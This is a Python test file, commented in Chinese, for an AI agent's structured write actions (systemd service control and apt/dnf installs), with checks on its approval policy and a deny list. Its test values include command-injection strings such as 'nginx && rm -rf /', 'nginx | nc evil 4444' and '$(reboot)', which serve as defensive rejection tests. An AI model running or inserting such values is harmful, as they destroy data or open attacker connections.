# -*- coding: utf-8 -*-
"""M1/S2: 结构化写动作契约测试（Issue #13，切片 8b）。

覆盖：
- systemd 服务操作（start/stop/restart）与包安装（apt/dnf）的
  服务端模板构造与白名单参数；
- 写动作永不自动：read_only 拒绝，其余精确审批；
- 构造结果过永久拒绝清单（如 stop auditd 绕过审计）。
"""
import pytest

from app.ai.autonomy.actions import (
    ActionValidationError,
    StructuredAction,
    build_write_command,
    list_write_kinds,
    validate_write_action,
)
from app.ai.autonomy.policy import (
    ApprovalDecision,
    classify_action,
)


# ---------------------------------------------------------------------------
# 服务端模板 + 白名单参数
# ---------------------------------------------------------------------------

def test_write_kind_registry():
    assert list_write_kinds() == ["package_install", "systemd"]


def test_systemd_templates_build_server_commands():
    for operation in ("start", "stop", "restart"):
        assert build_write_command(
            "systemd", {"operation": operation, "unit": "nginx"},
        ) == "systemctl %s nginx" % operation


def test_package_install_templates_use_configured_sources_only():
    assert build_write_command(
        "package_install", {"manager": "apt", "package": "nginx"},
    ) == "apt-get install --assume-yes --no-install-recommends nginx"
    assert build_write_command(
        "package_install", {"manager": "dnf", "package": "nginx"},
    ) == "dnf install --assumeyes nginx"


@pytest.mark.parametrize("operation", [
    "status",          # 只读，走探针 service.status
    "enable", "disable", "mask",   # 高影响变更，v1 不开放
    "reload", "daemon-reload",
    "", "start stop",
])
def test_systemd_operation_whitelist_is_exact(operation):
    with pytest.raises(ActionValidationError):
        validate_write_action(
            "systemd", {"operation": operation, "unit": "nginx"},
        )


@pytest.mark.parametrize("unit", [
    "nginx; reboot",
    "nginx && rm -rf /",
    "nginx | nc evil 4444",
    "$(reboot)",
    "unit with space",
    "a" * 129,
])
def test_systemd_unit_injection_attempts_are_rejected(unit):
    with pytest.raises(ActionValidationError):
        validate_write_action(
            "systemd", {"operation": "restart", "unit": unit},
        )


@pytest.mark.parametrize("manager", [
    "yum", "zypper", "apk", "pip", "apt; reboot", "",
])
def test_package_manager_whitelist_is_exact(manager):
    with pytest.raises(ActionValidationError):
        validate_write_action(
            "package_install", {"manager": manager, "package": "nginx"},
        )


@pytest.mark.parametrize("package", [
    "nginx; reboot",
    "-evil",            # 旗标伪装
    "--config=/etc/x",
    "pkg name",
    "a" * 129,
])
def test_package_name_injection_attempts_are_rejected(package):
    with pytest.raises(ActionValidationError):
        validate_write_action(
            "package_install", {"manager": "apt", "package": package},
        )


def test_extra_or_missing_write_parameters_are_rejected():
    with pytest.raises(ActionValidationError):
        validate_write_action(
            "systemd", {"operation": "restart", "unit": "nginx",
                        "extra": "x"},
        )
    with pytest.raises(ActionValidationError):
        validate_write_action("systemd", {"operation": "restart"})
    with pytest.raises(ActionValidationError):
        validate_write_action("deploy", {})


# ---------------------------------------------------------------------------
# 永久拒绝清单覆盖构造结果
# ---------------------------------------------------------------------------

def test_systemd_stop_auditd_hits_permanent_deny_list():
    with pytest.raises(ActionValidationError) as excinfo:
        build_write_command(
            "systemd", {"operation": "stop", "unit": "auditd"},
        )
    assert "permanently denied" in str(excinfo.value)


def test_benign_structured_writes_pass_the_deny_list():
    assert build_write_command(
        "systemd", {"operation": "restart", "unit": "nginx"},
    )
    assert build_write_command(
        "package_install", {"manager": "apt", "package": "curl"},
    )


# ---------------------------------------------------------------------------
# 审批策略：结构化写永不自动
# ---------------------------------------------------------------------------

def _write_action(kind, parameters):
    return StructuredAction(
        kind=kind, target_id=7, system_user_id=19,
        parameters=parameters, timeout_seconds=60, step_id="step-w",
    )


@pytest.mark.parametrize("kind,parameters", [
    ("systemd", {"operation": "restart", "unit": "nginx"}),
    ("package_install", {"manager": "apt", "package": "nginx"}),
])
def test_structured_writes_are_never_auto(kind, parameters):
    action = _write_action(kind, parameters)
    decision, _ = classify_action("read_only", action, "production")
    assert decision == ApprovalDecision.DENIED
    for mode in ("assisted", "lab_autonomous"):
        decision, _ = classify_action(mode, action, "lab")
        assert decision == ApprovalDecision.APPROVAL_REQUIRED
